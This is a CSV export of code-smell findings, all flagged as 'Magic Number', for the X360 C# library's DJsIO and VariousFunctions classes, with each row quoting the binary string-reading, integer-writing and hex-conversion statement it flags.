Implementation smell,Namespace,Class,File,Method,Description
Magic Number,X360.IO,DJsIO,C:\repos\mtolly_X360\X360\X360\IO\DJsIO.cs,ReadLine,The following statement contains a magic number: if (xType == StringForm.Unicode) {  	if (Position >= Length - 1)  		return "";  	byte[] buff = ReadBytes (2);  	while (buff [0] != BreakIndicator) {  		try {  			buffer.AddRange (buff);  			buff = ReadBytes (2);  		}  		catch {  			break;  		}  	}  	if (BigEndian)  		return Encoding.BigEndianUnicode.GetString (buffer.ToArray ());  	else  		return Encoding.Unicode.GetString (buffer.ToArray ());  }  else {  	if (Position >= Length)  		return "";  	byte buff = ReadByte ();  	while (buff != (byte)BreakIndicator) {  		try {  			buffer.Add (buff);  			buff = ReadByte ();  		}  		catch {  			break;  		}  	}  	return Encoding.ASCII.GetString (buffer.ToArray ()).Replace (PadType.Null.ToString ()' "");  }  
Magic Number,X360.IO,DJsIO,C:\repos\mtolly_X360\X360\X360\IO\DJsIO.cs,ReadLine,The following statement contains a magic number: if (xType == StringForm.Unicode) {  	if (Position >= Length - 1)  		return "";  	byte[] buff = ReadBytes (2);  	while (buff [0] != BreakIndicator) {  		try {  			buffer.AddRange (buff);  			buff = ReadBytes (2);  		}  		catch {  			break;  		}  	}  	if (BigEndian)  		return Encoding.BigEndianUnicode.GetString (buffer.ToArray ());  	else  		return Encoding.Unicode.GetString (buffer.ToArray ());  }  else {  	if (Position >= Length)  		return "";  	byte buff = ReadByte ();  	while (buff != (byte)BreakIndicator) {  		try {  			buffer.Add (buff);  			buff = ReadByte ();  		}  		catch {  			break;  		}  	}  	return Encoding.ASCII.GetString (buffer.ToArray ()).Replace (PadType.Null.ToString ()' "");  }  
Magic Number,X360.IO,DJsIO,C:\repos\mtolly_X360\X360\X360\IO\DJsIO.cs,ReadLine,The following statement contains a magic number: while (buff [0] != BreakIndicator) {  	try {  		buffer.AddRange (buff);  		buff = ReadBytes (2);  	}  	catch {  		break;  	}  }  
Magic Number,X360.IO,DJsIO,C:\repos\mtolly_X360\X360\X360\IO\DJsIO.cs,ReadLine,The following statement contains a magic number: try {  	buffer.AddRange (buff);  	buff = ReadBytes (2);  }  catch {  	break;  }  
Magic Number,X360.IO,DJsIO,C:\repos\mtolly_X360\X360\X360\IO\DJsIO.cs,ReadLine,The following statement contains a magic number: buff = ReadBytes (2);  
Magic Number,X360.IO,DJsIO,C:\repos\mtolly_X360\X360\X360\IO\DJsIO.cs,ReadString,The following statement contains a magic number: try {  	if (xRead == StringRead.ToNull) {  		if (Position >= Length - 1)  			return "";  		List<byte> buffer = new List<byte> ();  		if (xStringType == StringForm.Unicode) {  			byte[] buff = ReadBytes (2);  			int i = 0;  			while (xStringSize == 0 || i < xStringSize) {  				if (buff [0] == 0 && buff [1] == 0)  					break;  				try {  					buffer.AddRange (buff);  					buff = ReadBytes (2);  				}  				catch {  					break;  				}  			}  			if (BigEndian)  				return Encoding.BigEndianUnicode.GetString (buffer.ToArray ()).Replace (PadType.Null.ToString ()' "");  			else  				return Encoding.Unicode.GetString (buffer.ToArray ()).Replace (PadType.Null.ToString ()' "");  		}  		else {  			if (Position >= Length)  				return "";  			byte buff = ReadByte ();  			int i = 0;  			while (xStringSize == 0 || i < xStringSize) {  				if (buff == 0)  					break;  				try {  					buffer.Add (buff);  					buff = ReadByte ();  				}  				catch {  					break;  				}  				i++;  			}  			return Encoding.ASCII.GetString (buffer.ToArray ()).Replace (PadType.Null.ToString ()' "");  		}  	}  	else if (xRead == StringRead.PrecedingLength) {  		List<byte> Buffer = new List<byte> ();  		byte len = ReadByte ();  		for (int i = 0; i < len; i++) {  			if (xStringType == StringForm.ASCII)  				Buffer.AddRange (ReadBytes (2));  			else  				Buffer.Add (ReadByte ());  		}  		if (xStringType == StringForm.ASCII)  			return Encoding.ASCII.GetString (Buffer.ToArray ()).Replace (PadType.Null.ToString ()' "");  		else {  			if (BigEndian)  				return Encoding.BigEndianUnicode.GetString (Buffer.ToArray ()).Replace (PadType.Null.ToString ()' "");  			else  				return Encoding.Unicode.GetString (Buffer.ToArray ()).Replace (PadType.Null.ToString ()' "");  		}  	}  	else {  		byte[] buff = ReadBytes ((byte)xStringType * xStringSize);  		if (xStringType == StringForm.ASCII)  			return Encoding.ASCII.GetString (buff).Replace (PadType.Null.ToString ()' "");  		else {  			if (BigEndian)  				return Encoding.BigEndianUnicode.GetString (buff).Replace (PadType.Null.ToString ()' "");  			else  				return Encoding.Unicode.GetString (buff).Replace (PadType.Null.ToString ()' "");  		}  	}  }  catch (Exception x) {  	throw x;  }  
Magic Number,X360.IO,DJsIO,C:\repos\mtolly_X360\X360\X360\IO\DJsIO.cs,ReadString,The following statement contains a magic number: try {  	if (xRead == StringRead.ToNull) {  		if (Position >= Length - 1)  			return "";  		List<byte> buffer = new List<byte> ();  		if (xStringType == StringForm.Unicode) {  			byte[] buff = ReadBytes (2);  			int i = 0;  			while (xStringSize == 0 || i < xStringSize) {  				if (buff [0] == 0 && buff [1] == 0)  					break;  				try {  					buffer.AddRange (buff);  					buff = ReadBytes (2);  				}  				catch {  					break;  				}  			}  			if (BigEndian)  				return Encoding.BigEndianUnicode.GetString (buffer.ToArray ()).Replace (PadType.Null.ToString ()' "");  			else  				return Encoding.Unicode.GetString (buffer.ToArray ()).Replace (PadType.Null.ToString ()' "");  		}  		else {  			if (Position >= Length)  				return "";  			byte buff = ReadByte ();  			int i = 0;  			while (xStringSize == 0 || i < xStringSize) {  				if (buff == 0)  					break;  				try {  					buffer.Add (buff);  					buff = ReadByte ();  				}  				catch {  					break;  				}  				i++;  			}  			return Encoding.ASCII.GetString (buffer.ToArray ()).Replace (PadType.Null.ToString ()' "");  		}  	}  	else if (xRead == StringRead.PrecedingLength) {  		List<byte> Buffer = new List<byte> ();  		byte len = ReadByte ();  		for (int i = 0; i < len; i++) {  			if (xStringType == StringForm.ASCII)  				Buffer.AddRange (ReadBytes (2));  			else  				Buffer.Add (ReadByte ());  		}  		if (xStringType == StringForm.ASCII)  			return Encoding.ASCII.GetString (Buffer.ToArray ()).Replace (PadType.Null.ToString ()' "");  		else {  			if (BigEndian)  				return Encoding.BigEndianUnicode.GetString (Buffer.ToArray ()).Replace (PadType.Null.ToString ()' "");  			else  				return Encoding.Unicode.GetString (Buffer.ToArray ()).Replace (PadType.Null.ToString ()' "");  		}  	}  	else {  		byte[] buff = ReadBytes ((byte)xStringType * xStringSize);  		if (xStringType == StringForm.ASCII)  			return Encoding.ASCII.GetString (buff).Replace (PadType.Null.ToString ()' "");  		else {  			if (BigEndian)  				return Encoding.BigEndianUnicode.GetString (buff).Replace (PadType.Null.ToString ()' "");  			else  				return Encoding.Unicode.GetString (buff).Replace (PadType.Null.ToString ()' "");  		}  	}  }  catch (Exception x) {  	throw x;  }  
Magic Number,X360.IO,DJsIO,C:\repos\mtolly_X360\X360\X360\IO\DJsIO.cs,ReadString,The following statement contains a magic number: try {  	if (xRead == StringRead.ToNull) {  		if (Position >= Length - 1)  			return "";  		List<byte> buffer = new List<byte> ();  		if (xStringType == StringForm.Unicode) {  			byte[] buff = ReadBytes (2);  			int i = 0;  			while (xStringSize == 0 || i < xStringSize) {  				if (buff [0] == 0 && buff [1] == 0)  					break;  				try {  					buffer.AddRange (buff);  					buff = ReadBytes (2);  				}  				catch {  					break;  				}  			}  			if (BigEndian)  				return Encoding.BigEndianUnicode.GetString (buffer.ToArray ()).Replace (PadType.Null.ToString ()' "");  			else  				return Encoding.Unicode.GetString (buffer.ToArray ()).Replace (PadType.Null.ToString ()' "");  		}  		else {  			if (Position >= Length)  				return "";  			byte buff = ReadByte ();  			int i = 0;  			while (xStringSize == 0 || i < xStringSize) {  				if (buff == 0)  					break;  				try {  					buffer.Add (buff);  					buff = ReadByte ();  				}  				catch {  					break;  				}  				i++;  			}  			return Encoding.ASCII.GetString (buffer.ToArray ()).Replace (PadType.Null.ToString ()' "");  		}  	}  	else if (xRead == StringRead.PrecedingLength) {  		List<byte> Buffer = new List<byte> ();  		byte len = ReadByte ();  		for (int i = 0; i < len; i++) {  			if (xStringType == StringForm.ASCII)  				Buffer.AddRange (ReadBytes (2));  			else  				Buffer.Add (ReadByte ());  		}  		if (xStringType == StringForm.ASCII)  			return Encoding.ASCII.GetString (Buffer.ToArray ()).Replace (PadType.Null.ToString ()' "");  		else {  			if (BigEndian)  				return Encoding.BigEndianUnicode.GetString (Buffer.ToArray ()).Replace (PadType.Null.ToString ()' "");  			else  				return Encoding.Unicode.GetString (Buffer.ToArray ()).Replace (PadType.Null.ToString ()' "");  		}  	}  	else {  		byte[] buff = ReadBytes ((byte)xStringType * xStringSize);  		if (xStringType == StringForm.ASCII)  			return Encoding.ASCII.GetString (buff).Replace (PadType.Null.ToString ()' "");  		else {  			if (BigEndian)  				return Encoding.BigEndianUnicode.GetString (buff).Replace (PadType.Null.ToString ()' "");  			else  				return Encoding.Unicode.GetString (buff).Replace (PadType.Null.ToString ()' "");  		}  	}  }  catch (Exception x) {  	throw x;  }  
Magic Number,X360.IO,DJsIO,C:\repos\mtolly_X360\X360\X360\IO\DJsIO.cs,ReadString,The following statement contains a magic number: if (xRead == StringRead.ToNull) {  	if (Position >= Length - 1)  		return "";  	List<byte> buffer = new List<byte> ();  	if (xStringType == StringForm.Unicode) {  		byte[] buff = ReadBytes (2);  		int i = 0;  		while (xStringSize == 0 || i < xStringSize) {  			if (buff [0] == 0 && buff [1] == 0)  				break;  			try {  				buffer.AddRange (buff);  				buff = ReadBytes (2);  			}  			catch {  				break;  			}  		}  		if (BigEndian)  			return Encoding.BigEndianUnicode.GetString (buffer.ToArray ()).Replace (PadType.Null.ToString ()' "");  		else  			return Encoding.Unicode.GetString (buffer.ToArray ()).Replace (PadType.Null.ToString ()' "");  	}  	else {  		if (Position >= Length)  			return "";  		byte buff = ReadByte ();  		int i = 0;  		while (xStringSize == 0 || i < xStringSize) {  			if (buff == 0)  				break;  			try {  				buffer.Add (buff);  				buff = ReadByte ();  			}  			catch {  				break;  			}  			i++;  		}  		return Encoding.ASCII.GetString (buffer.ToArray ()).Replace (PadType.Null.ToString ()' "");  	}  }  else if (xRead == StringRead.PrecedingLength) {  	List<byte> Buffer = new List<byte> ();  	byte len = ReadByte ();  	for (int i = 0; i < len; i++) {  		if (xStringType == StringForm.ASCII)  			Buffer.AddRange (ReadBytes (2));  		else  			Buffer.Add (ReadByte ());  	}  	if (xStringType == StringForm.ASCII)  		return Encoding.ASCII.GetString (Buffer.ToArray ()).Replace (PadType.Null.ToString ()' "");  	else {  		if (BigEndian)  			return Encoding.BigEndianUnicode.GetString (Buffer.ToArray ()).Replace (PadType.Null.ToString ()' "");  		else  			return Encoding.Unicode.GetString (Buffer.ToArray ()).Replace (PadType.Null.ToString ()' "");  	}  }  else {  	byte[] buff = ReadBytes ((byte)xStringType * xStringSize);  	if (xStringType == StringForm.ASCII)  		return Encoding.ASCII.GetString (buff).Replace (PadType.Null.ToString ()' "");  	else {  		if (BigEndian)  			return Encoding.BigEndianUnicode.GetString (buff).Replace (PadType.Null.ToString ()' "");  		else  			return Encoding.Unicode.GetString (buff).Replace (PadType.Null.ToString ()' "");  	}  }  
Magic Number,X360.IO,DJsIO,C:\repos\mtolly_X360\X360\X360\IO\DJsIO.cs,ReadString,The following statement contains a magic number: if (xRead == StringRead.ToNull) {  	if (Position >= Length - 1)  		return "";  	List<byte> buffer = new List<byte> ();  	if (xStringType == StringForm.Unicode) {  		byte[] buff = ReadBytes (2);  		int i = 0;  		while (xStringSize == 0 || i < xStringSize) {  			if (buff [0] == 0 && buff [1] == 0)  				break;  			try {  				buffer.AddRange (buff);  				buff = ReadBytes (2);  			}  			catch {  				break;  			}  		}  		if (BigEndian)  			return Encoding.BigEndianUnicode.GetString (buffer.ToArray ()).Replace (PadType.Null.ToString ()' "");  		else  			return Encoding.Unicode.GetString (buffer.ToArray ()).Replace (PadType.Null.ToString ()' "");  	}  	else {  		if (Position >= Length)  			return "";  		byte buff = ReadByte ();  		int i = 0;  		while (xStringSize == 0 || i < xStringSize) {  			if (buff == 0)  				break;  			try {  				buffer.Add (buff);  				buff = ReadByte ();  			}  			catch {  				break;  			}  			i++;  		}  		return Encoding.ASCII.GetString (buffer.ToArray ()).Replace (PadType.Null.ToString ()' "");  	}  }  else if (xRead == StringRead.PrecedingLength) {  	List<byte> Buffer = new List<byte> ();  	byte len = ReadByte ();  	for (int i = 0; i < len; i++) {  		if (xStringType == StringForm.ASCII)  			Buffer.AddRange (ReadBytes (2));  		else  			Buffer.Add (ReadByte ());  	}  	if (xStringType == StringForm.ASCII)  		return Encoding.ASCII.GetString (Buffer.ToArray ()).Replace (PadType.Null.ToString ()' "");  	else {  		if (BigEndian)  			return Encoding.BigEndianUnicode.GetString (Buffer.ToArray ()).Replace (PadType.Null.ToString ()' "");  		else  			return Encoding.Unicode.GetString (Buffer.ToArray ()).Replace (PadType.Null.ToString ()' "");  	}  }  else {  	byte[] buff = ReadBytes ((byte)xStringType * xStringSize);  	if (xStringType == StringForm.ASCII)  		return Encoding.ASCII.GetString (buff).Replace (PadType.Null.ToString ()' "");  	else {  		if (BigEndian)  			return Encoding.BigEndianUnicode.GetString (buff).Replace (PadType.Null.ToString ()' "");  		else  			return Encoding.Unicode.GetString (buff).Replace (PadType.Null.ToString ()' "");  	}  }  
Magic Number,X360.IO,DJsIO,C:\repos\mtolly_X360\X360\X360\IO\DJsIO.cs,ReadString,The following statement contains a magic number: if (xRead == StringRead.ToNull) {  	if (Position >= Length - 1)  		return "";  	List<byte> buffer = new List<byte> ();  	if (xStringType == StringForm.Unicode) {  		byte[] buff = ReadBytes (2);  		int i = 0;  		while (xStringSize == 0 || i < xStringSize) {  			if (buff [0] == 0 && buff [1] == 0)  				break;  			try {  				buffer.AddRange (buff);  				buff = ReadBytes (2);  			}  			catch {  				break;  			}  		}  		if (BigEndian)  			return Encoding.BigEndianUnicode.GetString (buffer.ToArray ()).Replace (PadType.Null.ToString ()' "");  		else  			return Encoding.Unicode.GetString (buffer.ToArray ()).Replace (PadType.Null.ToString ()' "");  	}  	else {  		if (Position >= Length)  			return "";  		byte buff = ReadByte ();  		int i = 0;  		while (xStringSize == 0 || i < xStringSize) {  			if (buff == 0)  				break;  			try {  				buffer.Add (buff);  				buff = ReadByte ();  			}  			catch {  				break;  			}  			i++;  		}  		return Encoding.ASCII.GetString (buffer.ToArray ()).Replace (PadType.Null.ToString ()' "");  	}  }  else if (xRead == StringRead.PrecedingLength) {  	List<byte> Buffer = new List<byte> ();  	byte len = ReadByte ();  	for (int i = 0; i < len; i++) {  		if (xStringType == StringForm.ASCII)  			Buffer.AddRange (ReadBytes (2));  		else  			Buffer.Add (ReadByte ());  	}  	if (xStringType == StringForm.ASCII)  		return Encoding.ASCII.GetString (Buffer.ToArray ()).Replace (PadType.Null.ToString ()' "");  	else {  		if (BigEndian)  			return Encoding.BigEndianUnicode.GetString (Buffer.ToArray ()).Replace (PadType.Null.ToString ()' "");  		else  			return Encoding.Unicode.GetString (Buffer.ToArray ()).Replace (PadType.Null.ToString ()' "");  	}  }  else {  	byte[] buff = ReadBytes ((byte)xStringType * xStringSize);  	if (xStringType == StringForm.ASCII)  		return Encoding.ASCII.GetString (buff).Replace (PadType.Null.ToString ()' "");  	else {  		if (BigEndian)  			return Encoding.BigEndianUnicode.GetString (buff).Replace (PadType.Null.ToString ()' "");  		else  			return Encoding.Unicode.GetString (buff).Replace (PadType.Null.ToString ()' "");  	}  }  
Magic Number,X360.IO,DJsIO,C:\repos\mtolly_X360\X360\X360\IO\DJsIO.cs,ReadString,The following statement contains a magic number: if (xStringType == StringForm.Unicode) {  	byte[] buff = ReadBytes (2);  	int i = 0;  	while (xStringSize == 0 || i < xStringSize) {  		if (buff [0] == 0 && buff [1] == 0)  			break;  		try {  			buffer.AddRange (buff);  			buff = ReadBytes (2);  		}  		catch {  			break;  		}  	}  	if (BigEndian)  		return Encoding.BigEndianUnicode.GetString (buffer.ToArray ()).Replace (PadType.Null.ToString ()' "");  	else  		return Encoding.Unicode.GetString (buffer.ToArray ()).Replace (PadType.Null.ToString ()' "");  }  else {  	if (Position >= Length)  		return "";  	byte buff = ReadByte ();  	int i = 0;  	while (xStringSize == 0 || i < xStringSize) {  		if (buff == 0)  			break;  		try {  			buffer.Add (buff);  			buff = ReadByte ();  		}  		catch {  			break;  		}  		i++;  	}  	return Encoding.ASCII.GetString (buffer.ToArray ()).Replace (PadType.Null.ToString ()' "");  }  
Magic Number,X360.IO,DJsIO,C:\repos\mtolly_X360\X360\X360\IO\DJsIO.cs,ReadString,The following statement contains a magic number: if (xStringType == StringForm.Unicode) {  	byte[] buff = ReadBytes (2);  	int i = 0;  	while (xStringSize == 0 || i < xStringSize) {  		if (buff [0] == 0 && buff [1] == 0)  			break;  		try {  			buffer.AddRange (buff);  			buff = ReadBytes (2);  		}  		catch {  			break;  		}  	}  	if (BigEndian)  		return Encoding.BigEndianUnicode.GetString (buffer.ToArray ()).Replace (PadType.Null.ToString ()' "");  	else  		return Encoding.Unicode.GetString (buffer.ToArray ()).Replace (PadType.Null.ToString ()' "");  }  else {  	if (Position >= Length)  		return "";  	byte buff = ReadByte ();  	int i = 0;  	while (xStringSize == 0 || i < xStringSize) {  		if (buff == 0)  			break;  		try {  			buffer.Add (buff);  			buff = ReadByte ();  		}  		catch {  			break;  		}  		i++;  	}  	return Encoding.ASCII.GetString (buffer.ToArray ()).Replace (PadType.Null.ToString ()' "");  }  
Magic Number,X360.IO,DJsIO,C:\repos\mtolly_X360\X360\X360\IO\DJsIO.cs,ReadString,The following statement contains a magic number: while (xStringSize == 0 || i < xStringSize) {  	if (buff [0] == 0 && buff [1] == 0)  		break;  	try {  		buffer.AddRange (buff);  		buff = ReadBytes (2);  	}  	catch {  		break;  	}  }  
Magic Number,X360.IO,DJsIO,C:\repos\mtolly_X360\X360\X360\IO\DJsIO.cs,ReadString,The following statement contains a magic number: try {  	buffer.AddRange (buff);  	buff = ReadBytes (2);  }  catch {  	break;  }  
Magic Number,X360.IO,DJsIO,C:\repos\mtolly_X360\X360\X360\IO\DJsIO.cs,ReadString,The following statement contains a magic number: buff = ReadBytes (2);  
Magic Number,X360.IO,DJsIO,C:\repos\mtolly_X360\X360\X360\IO\DJsIO.cs,ReadString,The following statement contains a magic number: if (xRead == StringRead.PrecedingLength) {  	List<byte> Buffer = new List<byte> ();  	byte len = ReadByte ();  	for (int i = 0; i < len; i++) {  		if (xStringType == StringForm.ASCII)  			Buffer.AddRange (ReadBytes (2));  		else  			Buffer.Add (ReadByte ());  	}  	if (xStringType == StringForm.ASCII)  		return Encoding.ASCII.GetString (Buffer.ToArray ()).Replace (PadType.Null.ToString ()' "");  	else {  		if (BigEndian)  			return Encoding.BigEndianUnicode.GetString (Buffer.ToArray ()).Replace (PadType.Null.ToString ()' "");  		else  			return Encoding.Unicode.GetString (Buffer.ToArray ()).Replace (PadType.Null.ToString ()' "");  	}  }  else {  	byte[] buff = ReadBytes ((byte)xStringType * xStringSize);  	if (xStringType == StringForm.ASCII)  		return Encoding.ASCII.GetString (buff).Replace (PadType.Null.ToString ()' "");  	else {  		if (BigEndian)  			return Encoding.BigEndianUnicode.GetString (buff).Replace (PadType.Null.ToString ()' "");  		else  			return Encoding.Unicode.GetString (buff).Replace (PadType.Null.ToString ()' "");  	}  }  
Magic Number,X360.IO,DJsIO,C:\repos\mtolly_X360\X360\X360\IO\DJsIO.cs,ReadString,The following statement contains a magic number: for (int i = 0; i < len; i++) {  	if (xStringType == StringForm.ASCII)  		Buffer.AddRange (ReadBytes (2));  	else  		Buffer.Add (ReadByte ());  }  
Magic Number,X360.IO,DJsIO,C:\repos\mtolly_X360\X360\X360\IO\DJsIO.cs,ReadString,The following statement contains a magic number: if (xStringType == StringForm.ASCII)  	Buffer.AddRange (ReadBytes (2));  else  	Buffer.Add (ReadByte ());  
Magic Number,X360.IO,DJsIO,C:\repos\mtolly_X360\X360\X360\IO\DJsIO.cs,ReadString,The following statement contains a magic number: Buffer.AddRange (ReadBytes (2));  
Magic Number,X360.IO,DJsIO,C:\repos\mtolly_X360\X360\X360\IO\DJsIO.cs,WriteUInt24,The following statement contains a magic number: try {  	List<byte> xList = BitConv.GetBytes (xIn' false).ToList<byte> ();  	xList.RemoveAt (3);  	if (BigEndian)  		xList.Reverse ();  	Write (xList.ToArray ());  }  catch (Exception x) {  	throw x;  }  
Magic Number,X360.IO,DJsIO,C:\repos\mtolly_X360\X360\X360\IO\DJsIO.cs,WriteUInt24,The following statement contains a magic number: xList.RemoveAt (3);  
Magic Number,X360.IO,DJsIO,C:\repos\mtolly_X360\X360\X360\IO\DJsIO.cs,WriteUInt40,The following statement contains a magic number: try {  	List<byte> xList = BitConv.GetBytes (xIn' false).ToList<byte> ();  	xList.RemoveAt (5);  	xList.RemoveAt (5);  	xList.RemoveAt (5);  	if (BigEndian)  		xList.Reverse ();  	Write (xList.ToArray ());  }  catch (Exception x) {  	throw x;  }  
Magic Number,X360.IO,DJsIO,C:\repos\mtolly_X360\X360\X360\IO\DJsIO.cs,WriteUInt40,The following statement contains a magic number: try {  	List<byte> xList = BitConv.GetBytes (xIn' false).ToList<byte> ();  	xList.RemoveAt (5);  	xList.RemoveAt (5);  	xList.RemoveAt (5);  	if (BigEndian)  		xList.Reverse ();  	Write (xList.ToArray ());  }  catch (Exception x) {  	throw x;  }  
Magic Number,X360.IO,DJsIO,C:\repos\mtolly_X360\X360\X360\IO\DJsIO.cs,WriteUInt40,The following statement contains a magic number: try {  	List<byte> xList = BitConv.GetBytes (xIn' false).ToList<byte> ();  	xList.RemoveAt (5);  	xList.RemoveAt (5);  	xList.RemoveAt (5);  	if (BigEndian)  		xList.Reverse ();  	Write (xList.ToArray ());  }  catch (Exception x) {  	throw x;  }  
Magic Number,X360.IO,DJsIO,C:\repos\mtolly_X360\X360\X360\IO\DJsIO.cs,WriteUInt40,The following statement contains a magic number: xList.RemoveAt (5);  
Magic Number,X360.IO,DJsIO,C:\repos\mtolly_X360\X360\X360\IO\DJsIO.cs,WriteUInt40,The following statement contains a magic number: xList.RemoveAt (5);  
Magic Number,X360.IO,DJsIO,C:\repos\mtolly_X360\X360\X360\IO\DJsIO.cs,WriteUInt40,The following statement contains a magic number: xList.RemoveAt (5);  
Magic Number,X360.IO,DJsIO,C:\repos\mtolly_X360\X360\X360\IO\DJsIO.cs,WriteUInt48,The following statement contains a magic number: try {  	List<byte> xList = BitConv.GetBytes (xIn' false).ToList<byte> ();  	xList.RemoveAt (6);  	xList.RemoveAt (6);  	if (BigEndian)  		xList.Reverse ();  	Write (xList.ToArray ());  }  catch (Exception x) {  	throw x;  }  
Magic Number,X360.IO,DJsIO,C:\repos\mtolly_X360\X360\X360\IO\DJsIO.cs,WriteUInt48,The following statement contains a magic number: try {  	List<byte> xList = BitConv.GetBytes (xIn' false).ToList<byte> ();  	xList.RemoveAt (6);  	xList.RemoveAt (6);  	if (BigEndian)  		xList.Reverse ();  	Write (xList.ToArray ());  }  catch (Exception x) {  	throw x;  }  
Magic Number,X360.IO,DJsIO,C:\repos\mtolly_X360\X360\X360\IO\DJsIO.cs,WriteUInt48,The following statement contains a magic number: xList.RemoveAt (6);  
Magic Number,X360.IO,DJsIO,C:\repos\mtolly_X360\X360\X360\IO\DJsIO.cs,WriteUInt48,The following statement contains a magic number: xList.RemoveAt (6);  
Magic Number,X360.IO,DJsIO,C:\repos\mtolly_X360\X360\X360\IO\DJsIO.cs,WriteUInt56,The following statement contains a magic number: try {  	List<byte> xList = BitConv.GetBytes (xIn' BigEndian).ToList<byte> ();  	xList.RemoveAt (7);  	if (BigEndian)  		xList.Reverse ();  	Write (xList.ToArray ());  }  catch (Exception x) {  	throw x;  }  
Magic Number,X360.IO,DJsIO,C:\repos\mtolly_X360\X360\X360\IO\DJsIO.cs,WriteUInt56,The following statement contains a magic number: xList.RemoveAt (7);  
Magic Number,X360.Other,VariousFunctions,C:\repos\mtolly_X360\X360\X360\Other\Other.cs,IDToConsoleID,The following statement contains a magic number: foreach (char x in xid)  	xcrc = (byte)((byte.Parse (x.ToString ()) + xcrc) % 10);  
Magic Number,X360.Other,VariousFunctions,C:\repos\mtolly_X360\X360\X360\Other\Other.cs,IDToConsoleID,The following statement contains a magic number: xcrc = (byte)((byte.Parse (x.ToString ()) + xcrc) % 10);  
Magic Number,X360.Other,VariousFunctions,C:\repos\mtolly_X360\X360\X360\Other\Other.cs,IDToConsoleID,The following statement contains a magic number: return (long.Parse (xid) << 4 | xcrc);  
Magic Number,X360.Other,VariousFunctions,C:\repos\mtolly_X360\X360\X360\Other\Other.cs,ConsoleIDToID,The following statement contains a magic number: foreach (char x in xid)  	xcrc = (byte)((byte.Parse (x.ToString ()) + xcrc) % 10);  
Magic Number,X360.Other,VariousFunctions,C:\repos\mtolly_X360\X360\X360\Other\Other.cs,ConsoleIDToID,The following statement contains a magic number: xcrc = (byte)((byte.Parse (x.ToString ()) + xcrc) % 10);  
Magic Number,X360.Other,VariousFunctions,C:\repos\mtolly_X360\X360\X360\Other\Other.cs,HexToBytes,The following statement contains a magic number: if ((xInput.Length % 2) != 0)  	xInput = "0" + xInput;  
Magic Number,X360.Other,VariousFunctions,C:\repos\mtolly_X360\X360\X360\Other\Other.cs,HexToBytes,The following statement contains a magic number: try {  	for (int i = 0; i < xOutput.Length; i++)  		xOutput [i] = Convert.ToByte (xInput.Substring ((i * 2)' 2)' 16);  }  catch {  	throw VariousExcepts.ByteInput;  }  
Magic Number,X360.Other,VariousFunctions,C:\repos\mtolly_X360\X360\X360\Other\Other.cs,HexToBytes,The following statement contains a magic number: try {  	for (int i = 0; i < xOutput.Length; i++)  		xOutput [i] = Convert.ToByte (xInput.Substring ((i * 2)' 2)' 16);  }  catch {  	throw VariousExcepts.ByteInput;  }  
Magic Number,X360.Other,VariousFunctions,C:\repos\mtolly_X360\X360\X360\Other\Other.cs,HexToBytes,The following statement contains a magic number: try {  	for (int i = 0; i < xOutput.Length; i++)  		xOutput [i] = Convert.ToByte (xInput.Substring ((i * 2)' 2)' 16);  }  catch {  	throw VariousExcepts.ByteInput;  }  
Magic Number,X360.Other,VariousFunctions,C:\repos\mtolly_X360\X360\X360\Other\Other.cs,HexToBytes,The following statement contains a magic number: for (int i = 0; i < xOutput.Length; i++)  	xOutput [i] = Convert.ToByte (xInput.Substring ((i * 2)' 2)' 16);  
Magic Number,X360.Other,VariousFunctions,C:\repos\mtolly_X360\X360\X360\Other\Other.cs,HexToBytes,The following statement contains a magic number: for (int i = 0; i < xOutput.Length; i++)  	xOutput [i] = Convert.ToByte (xInput.Substring ((i * 2)' 2)' 16);  
Magic Number,X360.Other,VariousFunctions,C:\repos\mtolly_X360\X360\X360\Other\Other.cs,HexToBytes,The following statement contains a magic number: for (int i = 0; i < xOutput.Length; i++)  	xOutput [i] = Convert.ToByte (xInput.Substring ((i * 2)' 2)' 16);  
Magic Number,X360.Other,VariousFunctions,C:\repos\mtolly_X360\X360\X360\Other\Other.cs,HexToBytes,The following statement contains a magic number: xOutput [i] = Convert.ToByte (xInput.Substring ((i * 2)' 2)' 16);  
Magic Number,X360.Other,VariousFunctions,C:\repos\mtolly_X360\X360\X360\Other\Other.cs,HexToBytes,The following statement contains a magic number: xOutput [i] = Convert.ToByte (xInput.Substring ((i * 2)' 2)' 16);  
Magic Number,X360.Other,VariousFunctions,C:\repos\mtolly_X360\X360\X360\Other\Other.cs,HexToBytes,The following statement contains a magic number: xOutput [i] = Convert.ToByte (xInput.Substring ((i * 2)' 2)' 16);  
